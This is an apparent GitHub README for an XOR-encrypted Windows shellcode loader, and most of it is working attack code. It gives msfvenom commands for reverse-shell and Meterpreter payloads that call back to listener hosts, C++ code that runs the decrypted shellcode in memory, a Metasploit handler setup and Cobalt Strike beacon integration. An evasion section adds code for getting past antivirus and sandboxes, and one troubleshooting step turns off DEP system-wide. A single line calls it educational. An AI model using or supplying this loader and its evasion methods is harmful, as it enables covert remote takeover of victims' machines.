# Shellcode Loader

<div align="center">

![C++](https://img.shields.io/badge/C%2B%2B-00599C?style=for-the-badge&logo=c%2B%2B&logoColor=white)
![Python](https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white)
![Windows](https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)
![License](https://img.shields.io/badge/license-MIT-green?style=for-the-badge)

**A simple yet effective XOR-encrypted shellcode loader for Windows with Python encryption utility**

[Features](#features) • [Installation](#installation) • [Usage](#detailed-usage) • [How It Works](#how-it-works)

</div>

---

## Table of Contents

- [Overview](#overview)
- [Features](#features)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Usage](#detailed-usage)
  - [Encrypting Payloads](#1-encrypting-payloads)
  - [Loading Payloads](#2-loading-payloads)
  - [Customization](#3-customization)
- [How It Works](#how-it-works)
- [Evasion Techniques](#evasion-techniques)
- [Advanced Usage](#advanced-usage)
- [Troubleshooting](#troubleshooting)
- [Disclaimer](#disclaimer)
- [License](#license)

---

## Overview

This project implements a basic **XOR-encrypted shellcode loader** for Windows systems. It consists of two components:

1. **Python Encryption Tool** (`xorencrypt.py`) - Encrypts raw shellcode using XOR cipher
2. **C++ Loader** (`Loader.cpp`) - Decrypts and executes the encrypted payload in memory

The loader demonstrates fundamental techniques used in malware development and red team operations, including:
- Memory allocation and manipulation
- XOR encryption/decryption (can be changed)
- In-memory code execution
- Thread-based payload execution
---

## Features

### Core Capabilities

- **XOR Encryption**: Simple yet effective obfuscation technique
- **In-Memory Execution**: Payload runs entirely in memory without touching disk
- **Thread-Based Execution**: Runs shellcode in a separate thread
- **Cross-Architecture Support**: Works with any raw shellcode (x86/x64)
- **Memory Protection**: Proper RW → RX memory protection handling
- **File-Based Loading**: Reads encrypted payload from external file
- **Minimal Dependencies**: Uses only Windows API and standard libraries

### Evasion Features

- **Static Analysis Evasion**: Payload is encrypted on disk
- **Simple Obfuscation**: XOR cipher prevents basic signature detection
- **Modular Design**: Easy to extend with additional evasion techniques
- **Clean Error Handling**: Professional error management

---

## Installation

### Prerequisites

**For Python Script:**
- Python 3.6 or higher
- No external dependencies

**For C++ Loader:**
- Windows OS
- Visual Studio 2022
- Windows SDK

### Building the Loader

#### Visual Studio

```bash
# Clone the repository
- Download the project as zip to your computer
- Open Visual Studio
- Select **Build Solution** from the **Build** menu.
```

---

## Quick Start

### Step 1: Generate Shellcode

Generate your shellcode using msfvenom or any other tool:

```bash
# Example: Windows reverse shell (x64)
msfvenom -p windows/x64/shell_reverse_tcp \
         LHOST=192.168.1.100 \
         LPORT=4444 \
         -f raw -o shellcode.bin

# Example: Calculator popup (x64)
msfvenom -p windows/x64/exec CMD=calc.exe \
         -f raw -o shellcode.bin
```

### Step 2: Encrypt the Payload

```bash
# Encrypt the shellcode
python xorencrypt.py shellcode.bin

# Output: shellcode_encrypted.bin
```

### Step 3: Rename and Deploy

```bash
# Rename the encrypted file to user.dat
mv shellcode_encrypted.bin user.dat

# Place in the same directory as Loader.exe
```

### Step 4: Execute

```bash
# Run the Loader
Loader.exe
```

---

## Detailed Usage

### 1. Encrypting Payloads

#### Basic Encryption

```bash
python xorencrypt.py <input_file>
```

**Example:**
```bash
python xorencrypt.py shellcode.bin
# Output: shellcode_encrypted.bin
```

#### Custom Output Name

Modify the script to specify output filename:

```python
# In xorencrypt.py, change:
output_filename = "user.dat"  # Instead of auto-generated name
```

#### Verifying Encryption

```python
# Check file sizes match
import os
print(f"Original: {os.path.getsize('shellcode.bin')} bytes")
print(f"Encrypted: {os.path.getsize('shellcode_encrypted.bin')} bytes")
```

---

### 2. Loading Payloads

#### File Requirements

The loader expects:
- **Filename**: `user.dat` (hardcoded)
- **Location**: Same directory as `Loader.exe`
- **Format**: Raw XOR-encrypted binary

#### Execution Flow

```cpp
1. Open user.dat
2. Allocate RW memory
3. Read encrypted data
4. XOR decrypt in-place
5. Change to RX memory
6. Create thread at memory address
7. Wait for completion
```

#### Error Handling

The loader provides clear error messages:

| Error | Meaning | Solution |
|-------|---------|----------|
| `Failed to open user.dat` | File not found | Ensure user.dat exists |
| `Could not get file size` | File access issue | Check file permissions |
| `Memory allocation failed` | Insufficient memory | Close other applications |
| `Failed to read file` | I/O error | Verify file integrity |
| `Failed to change memory protection` | DEP conflict | Check DEP settings |
| `Failed to create execution thread` | Thread creation error | Check system resources |


---

### 3. Customization

#### Changing the XOR Key

**In Python (`xorencrypt.py`):**
```python
# Line 38 - Change the key
key = b"YourCustomKey123"
```

**In C++ (`Loader.cpp`):**
```cpp
// Line 28 - Must match Python key
const char xorKey[] = "YourCustomKey123";
```

⚠️ **Important**: Both keys must be identical!

#### Changing the Payload Filename

**In C++ (`Loader.cpp`):**
```cpp
// Line 31 - Change filename
fileHandle = CreateFileA(
    "custom_payload.dat",  // Change here
    GENERIC_READ,
    // ...
);
```

#### Adding Multiple XOR Rounds

Enhance encryption by applying XOR multiple times:

**In Python:**
```python
# Encrypt multiple times
ciphertext = plaintext
for _ in range(3):  # 3 rounds
    ciphertext = xor_encrypt(ciphertext, key)
```

**In C++:**
```cpp
// Decrypt multiple times
for (int i = 0; i < 3; i++) {
    XorBuffer(
        reinterpret_cast<char*>(allocatedMemory),
        fileSize.LowPart,
        xorKey,
        sizeof(xorKey)
    );
}
```

### Preview


![bypassav](https://github.com/user-attachments/assets/5ddb30a3-1989-412d-8887-0d55dd3d50a1)


---

## How It Works

### Python Encryption Tool

#### XOR Encryption Algorithm

```python
def xor_encrypt(data: bytes, key: bytes) -> bytes:
    encrypted = bytearray()
    key_length = len(key)
    
    for index, byte in enumerate(data):
        # XOR each byte with corresponding key byte
        key_byte = key[index % key_length]
        encrypted.append(byte ^ key_byte)
    
    return bytes(encrypted)
```

**How XOR Works:**
- Each byte of data is XORed with a byte from the key
- Key repeats if data is longer than key
- XOR is symmetric: encrypt and decrypt are the same operation

**Example:**
```
Data:    [0x41, 0x42, 0x43]  ("ABC")
Key:     [0x6B, 0x65, 0x79]  ("key")
Result:  [0x2A, 0x27, 0x3A]  (encrypted)

Reversing:
Encrypted: [0x2A, 0x27, 0x3A]
Key:       [0x6B, 0x65, 0x79]  ("key")
Result:    [0x41, 0x42, 0x43]  ("ABC") ✓
```

---

### C++ Loader

#### Step-by-Step Breakdown

**1. File Opening**
```cpp
fileHandle = CreateFileA(
    "user.dat",              // File to open
    GENERIC_READ,            // Read access
    FILE_SHARE_READ,         // Allow sharing
    nullptr,                 // Default security
    OPEN_EXISTING,           // Must exist
    FILE_ATTRIBUTE_NORMAL,   // Normal file
    nullptr                  // No template
);
```

**2. Memory Allocation**
```cpp
allocatedMemory = VirtualAlloc(
    nullptr,                      // Let OS choose address
    fileSize.LowPart,            // Size in bytes
    MEM_COMMIT | MEM_RESERVE,    // Reserve and commit
    PAGE_READWRITE               // RW permissions
);
```

**Why RW first?**
- Need to write decrypted data
- Will change to RX before execution

**3. File Reading**
```cpp
ReadFile(
    fileHandle,           // File handle
    allocatedMemory,      // Destination buffer
    fileSize.LowPart,     // Bytes to read
    &bytesRead,           // Bytes actually read
    nullptr               // No overlap
);
```

**4. XOR Decryption**
```cpp
void XorBuffer(char* buffer, size_t bufferSize, 
               const char* key, size_t keySize) {
    size_t keyIndex = 0;
    
    for (size_t i = 0; i < bufferSize; i++) {
        buffer[i] ^= key[keyIndex];
        keyIndex++;
        
        // Wrap around when key ends
        if (keyIndex >= keySize - 1) {
            keyIndex = 0;
        }
    }
}
```

**5. Memory Protection Change**
```cpp
VirtualProtect(
    allocatedMemory,      // Memory region
    fileSize.LowPart,     // Size
    PAGE_EXECUTE_READ,    // New protection (RX)
    &oldProtection        // Store old protection
);
```

**Why change to RX?**
- Security: Modern systems prevent execution from RW memory
- DEP (Data Execution Prevention) enforcement
- Required for legitimate execution

**6. Thread Creation**
```cpp
threadHandle = CreateThread(
    nullptr,              // Default security
    0,                    // Default stack size
    (LPTHREAD_START_ROUTINE)allocatedMemory,  // Entry point
    nullptr,              // No parameters
    0,                    // Start immediately
    nullptr               // Don't store thread ID
);
```

**Why use a thread?**
- Allows main program to continue
- Clean separation of execution
- Can wait for completion with WaitForSingleObject

**7. Synchronization**
```cpp
WaitForSingleObject(threadHandle, INFINITE);
```

Waits indefinitely for the shellcode thread to complete.

---

## Evasion Techniques

### Basic Improvements

#### 1. **API Obfuscation**
```cpp
// Use GetProcAddress to load APIs dynamically
typedef LPVOID (WINAPI* VirtualAllocFunc)(LPVOID, SIZE_T, DWORD, DWORD);

HMODULE kernel32 = GetModuleHandleA("kernel32.dll");
VirtualAllocFunc pVirtualAlloc = (VirtualAllocFunc)GetProcAddress(
    kernel32, "VirtualAlloc"
);
```

#### 2. **Sleep Evasion**
```cpp
// Add delays to evade sandbox timeouts
Sleep(10000);  // Sleep 10 seconds before execution
```

#### 3. **String Encryption**
```cpp
// Encrypt strings at compile time
const char encryptedFilename[] = {0x74, 0x73, 0x64, 0x71}; // "user"
```

#### 4. **Memory Fluctuation**
```cpp
// Change memory protection before/after use
VirtualProtect(allocatedMemory, size, PAGE_NOACCESS, &old);
Sleep(1000);
VirtualProtect(allocatedMemory, size, PAGE_EXECUTE_READ, &old);
```

---

## Advanced Usage

### Using with Metasploit

#### Generate Payload
```bash
# Generate staged payload
msfvenom -p windows/x64/meterpreter/reverse_tcp \
         LHOST=10.0.0.1 LPORT=443 \
         -f raw -o payload.bin

# Encrypt
python xorencrypt.py payload.bin
mv payload_encrypted.bin user.dat
```

#### Setup Listener
```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.1
set LPORT 443
exploit
```

### Cobalt Strike Integration

```bash
# Generate raw beacon
# In Cobalt Strike: Attacks → Packages → Windows Executable (S)
# Format: Raw

# Encrypt the beacon
python xorencrypt.py beacon.bin
mv beacon_encrypted.bin user.dat
```

### Custom Shellcode

#### Writing Custom Shellcode
```nasm
; Example: MessageBox in x64 assembly
section .text
global _start

_start:
    ; MessageBoxA(NULL, "Hello", "Title", MB_OK)
    xor rcx, rcx          ; hWnd = NULL
    lea rdx, [rel msg]    ; lpText
    lea r8, [rel title]   ; lpCaption
    xor r9, r9            ; uType = MB_OK
    
    mov rax, 0x7FFF0000   ; MessageBoxA address (example)
    call rax
    
    ret

msg:    db "Hello, World!", 0
title:  db "Shellcode", 0
```

Compile and extract:
```bash
nasm -f win64 shellcode.asm -o shellcode.o
objcopy -O binary shellcode.o shellcode.bin
python xorencrypt.py shellcode.bin
```

---

## Troubleshooting

### Common Issues

#### 1. "Failed to open user.dat"

**Cause:** File not found or inaccessible

**Solutions:**
```bash
# Check file exists
dir user.dat

# Check file permissions
icacls user.dat

# Ensure correct directory
cd /d C:\path\to\loader
```

#### 2. "Failed to change memory protection"

**Cause:** DEP (Data Execution Prevention) enabled

**Solutions:**
```bash
# Disable DEP for specific app (Admin cmd)
bcdedit /set nx AlwaysOff

# Or use VirtualAllocEx with EXECUTE flags from start
```

#### 3. Program Crashes Immediately

**Cause:** Incorrect XOR key or corrupted shellcode

**Solutions:**
- Verify both Python and C++ use same key
- Re-generate and re-encrypt payload
- Test with simple shellcode (calc.exe)

## Disclaimer

This software is provided for **EDUCATIONAL AND RESEARCH PURPOSES ONLY**.


## License

This project is licensed under the MIT License. For more information, see the [LICENSE file](LICENSE).


## Related Resources

### Learning Materials
- [Windows API Documentation](https://docs.microsoft.com/en-us/windows/win32/api/)
- [Malware Development](https://0xpat.github.io/)

### Tools
- [Metasploit Framework](https://www.metasploit.com/)
- [Cobalt Strike](https://www.cobaltstrike.com/)
- [msfvenom Cheat Sheet](https://github.com/frizb/MSF-Venom-Cheatsheet)
- [PE-bear](https://github.com/hasherezade/pe-bear-releases) - PE analysis

### Detection & Defense
- [Yara Rules](https://github.com/Yara-Rules/rules)
- [Sigma Rules](https://github.com/SigmaHQ/sigma)
- [Windows Event IDs](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/)

---

<div align="center">

[⬆ Back to Top](#shellcode-loader)

</div>

